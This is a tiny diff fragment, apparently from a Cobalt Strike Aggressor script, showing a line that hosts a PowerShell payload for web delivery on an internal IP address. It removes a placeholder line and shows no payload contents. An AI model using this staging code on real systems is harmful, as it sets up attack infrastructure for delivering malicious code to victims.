@@ -120,7 +120,6 @@ on ready {
 
     # Host payload
     site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
-    ...
 }
 ```
 
